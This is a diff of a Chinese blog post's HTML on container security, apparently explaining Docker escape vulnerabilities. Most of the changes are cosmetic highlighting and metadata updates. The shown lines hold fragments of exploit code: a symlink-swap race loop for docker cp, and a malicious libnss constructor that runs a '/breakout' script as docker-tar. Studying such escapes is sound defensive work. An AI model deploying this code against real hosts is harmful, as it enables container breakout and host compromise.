@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/www.geekby.site\/2021\/11\/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8\/"
-        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "云原生安全, docker","wordcount":  1441 ,
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "云原生安全, docker","wordcount":  1464 ,
         "url": "https:\/\/www.geekby.site\/2021\/11\/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8\/","datePublished": "2021-11-10T15:23:00+08:00","dateModified": "2021-11-13T11:00:00+08:00","publisher": {
             "@type": "Organization",
             "name": "Geekby","logo": {
@@ -109,7 +109,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">容器安全</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw"></i>云原生安全</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-11-10">2021-11-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1441 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-11-10">2021-11-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1464 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 7 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -317,17 +317,17 @@
 </span></span></span><span class="line"><span class="cl"><span class="cm">     * We use a directory to remove the possibility of ENOTDIR which reduces
 </span></span></span><span class="line"><span class="cl"><span class="cm">     * the chance of us winning.
 </span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">symlink</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="n">symlink_path</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">bail</span><span class="p">(</span><span class="s">&#34;create symlink_path&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mkdir</span><span class="p">(</span><span class="n">stash_path</span><span class="p">,</span> <span class="mo">0755</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">bail</span><span class="p">(</span><span class="s">&#34;mkdir stash_path&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">symlink</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="n">symlink_path</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">bail</span><span class="p">(</span><span class="s">&#34;create symlink_path&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">mkdir</span><span class="p">(</span><span class="n">stash_path</span><span class="p">,</span> <span class="mo">0755</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">bail</span><span class="p">(</span><span class="s">&#34;mkdir stash_path&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="cm">/* Now we do a RENAME_EXCHANGE forever. */</span>
 </span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="n">rrenameat2</span><span class="p">(</span><span class="n">AT_FDCWD</span><span class="p">,</span> <span class="n">symlink_path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">rrenameat2</span><span class="p">(</span><span class="n">AT_FDCWD</span><span class="p">,</span> <span class="n">symlink_path</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">                            <span class="n">AT_FDCWD</span><span class="p">,</span> <span class="n">stash_path</span><span class="p">,</span> <span class="n">RENAME_EXCHANGE</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="n">perror</span><span class="p">(</span><span class="s">&#34;symlink_swap: rename exchange failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;symlink_swap: rename exchange failed&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
@@ -431,7 +431,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">workdir=/var/lib/docker/overlay2/42549fa40947a72bc4f3ae8b8676297d774d4fe2f8afb7122717548b06861d85/work
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">workdir</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="mi">42549</span><span class="n">fa40947a72bc4f3ae8b8676297d774d4fe2f8afb7122717548b06861d85</span><span class="o">/</span><span class="n">work</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>容器在宿主机上的绝对路径即为：<code>/var/lib/docker/overlay2/42549fa40947a72bc4f3ae8b8676297d774d4fe2f8afb7122717548b06861d85/merged</code></p>
@@ -544,33 +544,33 @@
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
 </span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">is_priviliged</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="n">__attribute__</span> <span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="n">run_at_link</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span> <span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">run_at_link</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">     <span class="kt">char</span> <span class="o">*</span> <span class="n">argv_break</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">  <span class="c1">// 判断是否容器外是高权限执行，即 docker-tar
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_priviliged</span><span class="p">())</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">is_priviliged</span><span class="p">())</span>
 </span></span><span class="line"><span class="cl">           <span class="k">return</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> 
 </span></span><span class="line"><span class="cl">  <span class="c1">// 攻击执行一次即可，用原始的替换备份的库文件
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// 避免后续对环境产生影响
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="n">rename</span><span class="p">(</span><span class="n">ORIGINAL_LIBNSS</span><span class="p">,</span> <span class="n">LIBNSS_PATH</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="nf">rename</span><span class="p">(</span><span class="n">ORIGINAL_LIBNSS</span><span class="p">,</span> <span class="n">LIBNSS_PATH</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">    <span class="c1">// 以 docker-tar 运行 /breakout 恶意脚本
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fork</span><span class="p">())</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">fork</span><span class="p">())</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">// Child runs breakout
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">argv_break</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="s">&#34;/breakout&#34;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">argv_break</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">strdup</span><span class="p">(</span><span class="s">&#34;/breakout&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="n">argv_break</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">execve</span><span class="p">(</span><span class="s">&#34;/breakout&#34;</span><span class="p">,</span> <span class="n">argv_break</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">execve</span><span class="p">(</span><span class="s">&#34;/breakout&#34;</span><span class="p">,</span> <span class="n">argv_break</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">     <span class="p">}</span>
 </span></span><span class="line"><span class="cl">     <span class="k">else</span>
-</span></span><span class="line"><span class="cl">        <span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span> <span class="c1">// Wait for child
+</span></span><span class="line"><span class="cl">        <span class="nf">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span> <span class="c1">// Wait for child
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
 </span></span><span class="line"><span class="cl">     <span class="k">return</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="n">is_priviliged</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">     <span class="n">FILE</span> <span class="o">*</span> <span class="n">proc_file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;/proc/self/exe&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">is_priviliged</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">     <span class="n">FILE</span> <span class="o">*</span> <span class="n">proc_file</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/proc/self/exe&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(</span><span class="n">proc_file</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">           <span class="n">fclose</span><span class="p">(</span><span class="n">proc_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">           <span class="nf">fclose</span><span class="p">(</span><span class="n">proc_file</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">           <span class="k">return</span> <span class="nb">false</span><span class="p">;</span> <span class="c1">// can open so /proc exists, not privileged
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="p">}</span>
 </span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="nb">true</span><span class="p">;</span> <span class="c1">// we&#39;re running in the context of docker-tar
@@ -1161,7 +1161,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
